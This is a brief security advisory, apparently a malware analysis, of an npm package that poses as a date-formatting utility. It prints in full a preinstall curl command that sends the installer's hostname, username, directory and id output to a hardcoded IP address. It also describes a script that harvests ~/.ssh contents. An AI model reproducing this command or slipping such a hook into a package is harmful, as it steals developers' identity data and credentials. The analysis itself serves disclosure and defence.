summary: preinstall hook exfiltrates host identity to hardcoded bare-IP C2
details: package.json declares a preinstall script that runs `curl http://124.221.154.135/post?h=$(hostname)&u=$(whoami)&d=$(pwd)&id=$(id | base64 | tr -d '\n')`, automatically firing on `npm install` and shipping the installer's hostname, username, current working directory, and base64-encoded `id` output to a bare IPv4 endpoint over plain HTTP. A sibling postinstall.js (not wired to a lifecycle hook but shipped in the tarball) enumerates `~/.ssh` and POSTs JSON to the same `124.221.154.135` host, corroborating credential-harvesting intent. The package describes itself as 'A simple date formatting utility' and ships only a 5-line index.js implementing `toLocaleDateString`, an obvious cover story for the exfil payload. Empty author field, generic description, and no homepage match the disposable-throwaway malicious-package shape.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
